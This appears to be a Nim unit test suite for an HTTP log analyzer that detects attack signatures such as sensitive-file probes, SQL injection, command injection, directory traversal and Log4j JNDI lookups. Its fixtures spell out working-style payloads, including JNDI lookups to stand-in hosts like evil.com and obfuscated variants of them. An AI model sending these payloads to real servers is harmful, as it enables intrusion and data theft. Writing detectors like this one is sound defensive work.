## Test Suite for Phase 04 / Category A: Attack Signature & Payload Detection
## Tests Sensitive File Probes, CMS Exploits, Directory Traversal,
## SQL Injection, Command Injection (RCE), Log4j / JNDI, and OWASP Top 10.

import std/[unittest, options, strutils]
import http_logviewer/core/types
import http_logviewer/analyzer/signatures

suite "Attack Signatures - Sensitive File Probes (Phase 04 / Category A / Item 01)":
  test "Item 01: Detects standard sensitive files in root and subdirectories":
    check isSensitiveFileProbe("/.env")
    check isSensitiveFileProbe("/.env.local")
    check isSensitiveFileProbe("/.git/config")
    check isSensitiveFileProbe("/.git/HEAD")
    check isSensitiveFileProbe("/.aws/credentials")
    check isSensitiveFileProbe("/wp-config.php")
    check isSensitiveFileProbe("/config.json")
    check isSensitiveFileProbe("/docker-compose.yml")
    check isSensitiveFileProbe("/id_rsa")
    check isSensitiveFileProbe("/.ssh/id_rsa")
    check isSensitiveFileProbe("/actuator/env")
    check isSensitiveFileProbe("/actuator/health")
    check isSensitiveFileProbe("/backup.sql")
    check isSensitiveFileProbe("/dump.sql")
    check isSensitiveFileProbe("/phpinfo.php")

  test "Item 01: Case insensitivity and URL decoding for sensitive files":
    check isSensitiveFileProbe("/%2eenv")
    check isSensitiveFileProbe("/%2EENV")
    check isSensitiveFileProbe("/.ENV")
    check isSensitiveFileProbe("/WP-CONFIG.PHP")
    check isSensitiveFileProbe("/%2e%67%69%74/config")

  test "Item 01: Sensitive files probed inside query string parameters":
    check isSensitiveFileProbe("/index.php?download=wp-config.php")
    check isSensitiveFileProbe("/api/fetch?path=.env")
    check isSensitiveFileProbe("/view?file=database.yml")

  test "Item 01: Benign static assets and paths are NOT flagged":
    check not isSensitiveFileProbe("/index.html")
    check not isSensitiveFileProbe("/styles/main.css")
    check not isSensitiveFileProbe("/js/bundle.js")
    check not isSensitiveFileProbe("/images/logo.png")
    check not isSensitiveFileProbe("/about-us")
    check not isSensitiveFileProbe("/products/environment-friendly")

suite "Attack Signatures - CMS & Web Admin Exploits (Phase 04 / Category A / Item 02)":
  test "Item 02: Detects known CMS login, xmlrpc, and admin paths":
    check isCmsExploit("/wp-login.php")
    check isCmsExploit("/xmlrpc.php")
    check isCmsExploit("/wp-admin/")
    check isCmsExploit("/wp-admin/admin-ajax.php")
    check isCmsExploit("/wp-includes/wlwmanifest.xml")
    check isCmsExploit("/administrator/")

  test "Item 02: Detects database management tools and framework debuggers":
    check isCmsExploit("/phpmyadmin")
    check isCmsExploit("/phpmyadmin/index.php")
    check isCmsExploit("/pma/")
    check isCmsExploit("/admin/pma/")
    check isCmsExploit("/mysql/")
    check isCmsExploit("/setup.php")
    check isCmsExploit("/install.php")
    check isCmsExploit("/boaform/admin/")
    check isCmsExploit("/solr/admin/")
    check isCmsExploit("/telescope/requests")
    check isCmsExploit("/debug/default/view")

  test "Item 02: Normal blog and store paths are NOT flagged as CMS exploits":
    check not isCmsExploit("/blog/my-first-post")
    check not isCmsExploit("/shop/category/shoes")
    check not isCmsExploit("/contact")

suite "Attack Signatures - Directory Traversal Detector (Phase 04 / Category A / Item 03)":
  test "Item 03: Detects standard ../ and ..\\ traversal":
    check isDirectoryTraversal("/../../../etc/passwd")
    check isDirectoryTraversal("..\\..\\windows\\win.ini")
    check isDirectoryTraversal("/static/images/../../secret.txt")

  test "Item 03: Detects single and double URL-encoded traversals":
    check isDirectoryTraversal("/%2e%2e%2fetc/passwd")
    check isDirectoryTraversal("/%2e%2e/etc/passwd")
    check isDirectoryTraversal("/..%2fetc/passwd")
    check isDirectoryTraversal("/%252e%252e%252fetc/passwd")
    check isDirectoryTraversal("/%2e%2e%5cwindows/win.ini")

  test "Item 03: Detects system file targets without explicit dots":
    check isDirectoryTraversal("/etc/passwd")
    check isDirectoryTraversal("/etc/shadow")
    check isDirectoryTraversal("/boot.ini")
    check isDirectoryTraversal("/proc/self/environ")
    check isDirectoryTraversal("/windows/system32/cmd.exe")

  test "Item 03: Benign paths with dots do NOT trigger directory traversal":
    check not isDirectoryTraversal("/v1.2.3/api")
    check not isDirectoryTraversal("/release-notes-2.0.html")
    check not isDirectoryTraversal("/images/logo.v2.png")

suite "Attack Signatures - SQL Injection Pattern Detector (Phase 04 / Category A / Item 04)":
  test "Item 04: Detects UNION SELECT variations":
    check isSqlInjection("/search?q=1+union+select+1,2,3--")
    check isSqlInjection("/items?cat=shoes%20union%20select%20null,username,password%20from%20users")
    check isSqlInjection("/product?id=1 union select 1,2,3")

  test "Item 04: Detects boolean and error-based tautologies":
    check isSqlInjection("/login?user=' or '1'='1")
    check isSqlInjection("/login?user=' or 1=1--")
    check isSqlInjection("/login?user=\" or \"1\"=\"1")
    check isSqlInjection("/query?param=' or ''='")

  test "Item 04: Detects blind timing and information schema probes":
    check isSqlInjection("/article?id=1; waitfor delay '0:0:5'")
    check isSqlInjection("/article?id=1 AND sleep(5)")
    check isSqlInjection("/search?q=1 AND benchmark(1000000,MD5(1))")
    check isSqlInjection("/api?q=select from information_schema.tables")

  test "Item 04: Benign queries do NOT trigger SQL injection":
    check not isSqlInjection("/search?q=union+bank")
    check not isSqlInjection("/articles/select-the-right-tool")
    check not isSqlInjection("/order?sort=price&dir=desc")

suite "Attack Signatures - Remote Code Execution (RCE) & Command Injection (Phase 04 / Category A / Item 05)":
  test "Item 05: Detects shell command chaining and backticks":
    check isCommandInjection("/cgi-bin/test?param=1;id")
    check isCommandInjection("/exec?cmd=1|id")
    check isCommandInjection("/ping?host=`id`")
    check isCommandInjection("/lookup?ip=$(whoami)")
    check isCommandInjection("/status?run=;whoami")
    check isCommandInjection("/test?val=|whoami")

  test "Item 05: Detects direct binary and interpreter invocations":
    check isCommandInjection("/cgi-bin/upload.cgi?sh=/bin/sh")
    check isCommandInjection("/exec?binary=/bin/bash")
    check isCommandInjection("/scripts?file=cmd.exe")

  test "Item 05: Detects eval, base64_decode, and system functions":
    check isCommandInjection("/index.php?code=base64_decode('aW5mbygp')")
    check isCommandInjection("/api?fn=eval(malicious_code)")
    check isCommandInjection("/test?run=system('cat /etc/passwd')")
    check isCommandInjection("/exec?call=passthru('ls')")

  test "Item 05: Normal commands and queries are NOT flagged":
    check not isCommandInjection("/identity/profile")
    check not isCommandInjection("/search?q=whoami+band")
    check not isCommandInjection("/docs/guide.html")

suite "Attack Signatures - Log4j / JNDI Probe Detector (Phase 04 / Category A / Item 06)":
  test "Item 06: Detects standard JNDI LDAP, RMI, and DNS lookups":
    check isLog4jJndi("/?search=${jndi:ldap://evil.com/a}")
    check isLog4jJndi("/api/${jndi:rmi://192.168.1.100:1099/exploit}")
    check isLog4jJndi("/test?token=${jndi:dns://attacker.com/z}")
    check isLog4jJndi("/login?user=${jndi:iiop://evil.org}")

  test "Item 06: Detects nested and obfuscated JNDI evasion techniques":
    check isLog4jJndi("/?q=${${lower:j}ndi:ldap://attacker.com/payload}")
    check isLog4jJndi("/?user=${${upper:j}ndi:rmi://bad.com/test}")
    check isLog4jJndi("/path?a=${${::-j}ndi:dns://target.com}")
    check isLog4jJndi("/path?a=${${env:NaN:-j}ndi:ldap://domain.com}")

  test "Item 06: Normal template strings and brackets are NOT flagged":
    check not isLog4jJndi("/render?template=${username}")
    check not isLog4jJndi("/search?q={hello}")

suite "Attack Signatures - OWASP Top 10 Scanner & Payload Analyzer (Phase 04 / Category A / Item 07)":
  test "Item 07: scanAttackSignatures accurately classifies findings":
    let findings1 = scanAttackSignatures("/wp-login.php?redirect=/.env")
    check findings1.len >= 2
    var categories: set[AttackCategory] = {}
    for f in findings1:
      categories.incl(f.category)
    check AttackCmsExploit in categories
    check AttackSensitiveFile in categories

  test "Item 07: analyzeAttackPayload sets appropriate ThreatFlags":
    let (flags1, matches1) = analyzeAttackPayload("/../../../etc/passwd")
    check ThreatDirectoryTraversal in flags1
    check matches1.len > 0

    let (flags2, matches2) = analyzeAttackPayload("/search?id=1+union+select+1,2,3")
    check ThreatSqlInjection in flags2
    check matches2.len > 0

    let (flags3, matches3) = analyzeAttackPayload("/?q=${jndi:ldap://evil.com/x}")
    check ThreatCommandInjection in flags3
    check matches3.len > 0

    let (flags4, matches4) = analyzeAttackPayload("/.env")
    check ThreatSensitiveFile in flags4
    check matches4.len > 0

    let (flags5, matches5) = analyzeAttackPayload("/wp-login.php")
    check ThreatCmsExploit in flags5
    check matches5.len > 0

  test "Item 07: Clean normal requests yield empty flags and empty matches":
    let (flags, matches) = analyzeAttackPayload("/index.html")
    check flags == {}
    check matches.len == 0
    check not containsAttackSignature("/index.html")

  test "Item 07: Multi-vector adversarial payload detection":
    let complexUri = "/wp-login.php?redirect=..%2f..%2f.env&query=' union select 1,2,3--"
    let (flags, matches) = analyzeAttackPayload(complexUri)
    check ThreatCmsExploit in flags
    check ThreatDirectoryTraversal in flags
    check ThreatSensitiveFile in flags
    check ThreatSqlInjection in flags
    check matches.len >= 4
